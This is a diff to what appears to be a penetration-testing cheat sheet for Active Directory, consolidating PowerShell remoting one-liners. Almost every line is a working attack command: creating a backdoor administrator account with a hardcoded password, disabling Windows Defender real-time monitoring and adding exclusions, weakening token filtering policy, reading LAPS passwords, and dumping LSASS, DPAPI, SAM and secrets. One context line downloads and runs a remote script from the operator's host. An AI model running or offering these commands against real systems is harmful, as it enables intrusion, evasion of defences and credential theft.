@@ -1527,23 +1527,15 @@ IEX (New-Object Net.WebClient).DownloadString('http://$MYIP/Invoke-RunasCs.ps1')
 powershell -c "Restore-ADObject -Identity 'GUID or DistinguishedName'"
 
 +---------- CanPSRemote (AdminTo) ----------+
-Invoke-Command -ComputerName SRV01 -ScriptBlock { whoami /priv }
-Invoke-Command -ComputerName SRV01 -ScriptBlock { arp /a }
-Invoke-Command -ComputerName SRV01 -ScriptBlock { ipconfig /all }
-Invoke-Command -ComputerName SRV01 -ScriptBlock { net user dbf 123qweasdF! /add; net localgroup Administrators dbf /add }
-Invoke-Command -ComputerName SRV01 -ScriptBlock { New-SmbShare -Name tasks -Path "C:\Windows\Tasks" -FullAccess dbf }
-Invoke-Command -ComputerName SRV01 -ScriptBlock { Add-MpPreference -ExclusionPath "C:\Windows\Tasks" }
-Invoke-Command -ComputerName SRV01 -ScriptBlock { Set-MpPreference -DisableRealtimeMonitoring $true }
-Invoke-Command -ComputerName SRV01 -ScriptBlock { reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f }
+Invoke-Command -ComputerName SRV01 -ScriptBlock { whoami /priv; arp /a; ipconfig /all }
+Invoke-Command -ComputerName SRV01 -ScriptBlock { net user dbf 123qweasdF! /add; net localgroup Administrators dbf /add; reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f }
+Invoke-Command -ComputerName SRV01 -ScriptBlock { New-SmbShare -Name tasks -Path "C:\Windows\Tasks" -FullAccess dbf; Add-MpPreference -ExclusionPath "C:\Windows\Tasks"; Set-MpPreference -DisableRealtimeMonitoring $true }
 
 +---------- LAPS ----------+
 impacket-GetLAPSPassword -dc-ip $TARGET $DOM/'$USERNAME:$PASSWORD' | awk '$1 ~ /\$$/ {print $1 " --> Administrator:" $3}'
-$computer='WS02'; $pass='YwBxQ1hv'; Set-Item WSMan:\localhost\Client\TrustedHosts -Value $computer -Force -Confirm:$false; $sec=ConvertTo-SecureString $pass -AsPlainText -Force; $cred=New-Object System.Management.Automation.PSCredential("$computer\Administrator",$sec); Invoke-Command -ComputerName $computer -Credential $cred -Authentication Negotiate -ScriptBlock { hostname; whoami; ipconfig /all }
-Invoke-Command -ComputerName $computer -Credential $cred -ScriptBlock { net user dbf 123qweasdF! /add; net localgroup Administrators dbf /add }
-Invoke-Command -ComputerName $computer -Credential $cred -ScriptBlock { New-SmbShare -Name tasks -Path "C:\Windows\Tasks" -FullAccess dbf }
-Invoke-Command -ComputerName $computer -Credential $cred -ScriptBlock { Add-MpPreference -ExclusionPath "C:\Windows\Tasks" }
-Invoke-Command -ComputerName $computer -Credential $cred -ScriptBlock { Set-MpPreference -DisableRealtimeMonitoring $true }
-Invoke-Command -ComputerName $computer -Credential $cred -ScriptBlock { reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f }
+$computer='WS02'; $pass='YwBxQ1hv'; Set-Item WSMan:\localhost\Client\TrustedHosts -Value $computer -Force -Confirm:$false; $sec=ConvertTo-SecureString $pass -AsPlainText -Force; $cred=New-Object System.Management.Automation.PSCredential("$computer\Administrator",$sec); Invoke-Command -ComputerName $computer -Credential $cred -Authentication Negotiate -ScriptBlock { whoami /priv; arp /a; ipconfig /all }
+Invoke-Command -ComputerName $computer -Credential $cred -ScriptBlock { net user dbf 123qweasdF! /add; net localgroup Administrators dbf /add; reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f }
+Invoke-Command -ComputerName $computer -Credential $cred -ScriptBlock { New-SmbShare -Name tasks -Path "C:\Windows\Tasks" -FullAccess dbf; Add-MpPreference -ExclusionPath "C:\Windows\Tasks"; Set-MpPreference -DisableRealtimeMonitoring $true }
 
 +---------- dbf: Account Created ----------+
 (t=$TARGET; echo '\033[33m--------------[ DPAPI ]--------------\033[0m';nxc smb $t -u dbf -p '123qweasdF!' --dpapi --local-auth; echo '\033[33m--------------[ LSASS ]--------------\033[0m';nxc smb $t -u dbf -p '123qweasdF!' -M lsassy --local-auth; echo '\033[33m--------------[ SAM + SECRETS ]--------------\033[0m'; impacket-secretsdump 'dbf:123qweasdF!'@$t) | tee dump_$t
